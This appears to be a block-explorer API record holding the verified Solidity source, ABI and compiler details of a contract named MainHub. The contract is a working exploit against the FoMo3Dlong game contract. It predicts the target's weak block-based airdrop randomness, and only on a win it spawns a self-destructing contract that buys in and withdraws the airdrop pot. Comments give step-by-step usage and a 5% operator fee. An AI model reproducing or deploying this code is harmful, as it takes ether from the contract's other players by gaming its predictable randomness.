{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n/**\r\n * How to use just send a tx of 0 eth to this contract address with 600k gas limit and message data 0x9e5faafc\r\n * although it will probably not use that much it is just to be safe, as metamask will say the tx will fail\r\n * because it doesnt know what the random number will be so you have to put the gas limit in yourself, also\r\n * remember any unused gas is refunded so it wont cost much even if it fails. (failed tx will cost only a couple cents)\r\n **/\r\n\r\ncontract FoMo3Dlong{\r\n    uint256 public airDropPot_;\r\n    uint256 public airDropTracker_;\r\n    function withdraw() public;\r\n    function buyXaddr(address _affCode, uint256 _team) public payable;\r\n}\r\n\r\ncontract MainHub{\r\n    using SafeMath for *;\r\n    address public owner;\r\n    bool public closed = false;\r\n    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);\r\n    \r\n    modifier onlyOwner{\r\n        require(msg.sender==owner);\r\n        _;\r\n    }\r\n    \r\n    modifier onlyNotClosed{\r\n        require(!closed);\r\n        _;\r\n    }\r\n    \r\n    constructor() public payable{\r\n        require(msg.value==.1 ether);\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function attack() public onlyNotClosed{\r\n        require(code.airDropPot_()>=.5 ether); //requires there is at least a pot of .5 ether otherwise not worth it.\r\n        require(airdrop());\r\n        uint256 initialBalance = address(this).balance;\r\n        (new AirdropHacker).value(.1 ether)();\r\n        uint256 postBalance = address(this).balance;\r\n        uint256 takenAmount = postBalance - initialBalance;\r\n        msg.sender.transfer(takenAmount*95/100); //5% fee, you didnt risk anything anyway.\r\n        require(address(this).balance>=.1 ether);//last sanity check (why the hell not?) if it reaches this you already won anyway\r\n    }\r\n    \r\n    function airdrop() private view returns(bool)\r\n    {\r\n        uint256 seed = uint256(keccak256(abi.encodePacked(\r\n            \r\n            (block.timestamp).add\r\n            (block.difficulty).add\r\n            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\r\n            (block.gaslimit).add\r\n            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\r\n            (block.number)\r\n            \r\n        )));\r\n        if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_())//looks at thier airdrop tracking number\r\n            return(true);\r\n        else\r\n            return(false);\r\n    }\r\n    \r\n    function drain() public onlyOwner{\r\n        closed = true;\r\n        owner.transfer(address(this).balance);//since funds are transfered immediately any money that is left in the contract is mine.\r\n    }\r\n    function() public payable{}\r\n}\r\n\r\ncontract AirdropHacker{\r\n    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);\r\n    constructor() public payable{\r\n        code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2);//just a random address\r\n        code.withdraw();\r\n        require(address(this).balance>=.1 ether);//would get 1/4 of airdrop, which appears to be on average .2 ether, this is just a sanity check\r\n        selfdestruct(msg.sender);\r\n    }\r\n    \r\n    function() public payable{}\r\n    \r\n}\r\n\r\nlibrary SafeMath {\r\n    /**\r\n    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n    */\r\n    function sub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256) \r\n    {\r\n        require(b <= a, \"SafeMath sub failed\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n    * @dev Adds two numbers, throws on overflow.\r\n    */\r\n    function add(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256 c) \r\n    {\r\n        c = a + b;\r\n        require(c >= a, \"SafeMath add failed\");\r\n        return c;\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"closed\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"drain\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"MainHub","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://cfb715f2fa122959d39c11202afefbde35f18f69b02dc4c54d3e7807eec60fc1"}]}